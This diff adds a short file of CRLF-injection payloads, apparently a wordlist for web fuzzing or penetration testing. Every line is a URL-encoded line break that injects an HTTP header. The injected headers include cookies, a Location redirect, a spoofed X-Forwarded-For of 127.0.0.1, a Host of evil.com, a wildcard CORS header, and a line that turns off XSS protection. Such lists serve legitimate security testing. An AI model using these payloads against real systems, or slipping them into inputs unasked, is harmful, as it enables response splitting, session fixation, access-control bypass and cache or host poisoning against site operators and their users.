@@ -1,0 +1,14 @@
+%0d%0aSet-Cookie:injected=true
+%0aSet-Cookie:injected=true
+%0dSet-Cookie:injected=true
+\r\nSet-Cookie:injected
+%23%0d%0aHeader:injected
+?crlf=%0d%0aLocation:%20
+%0d%0aX-Forwarded-For:127.0.0.1
+%0d%0aX-Header:injected
+%0d%0aHost:evil.com
+%0d%0aUser-Agent:injected
+%0d%0aReferer:injected
+%0d%0aContent-Type:injected
+%0d%0aX-XSS-Protection:0
+%0d%0aAccess-Control-Allow-Origin:*
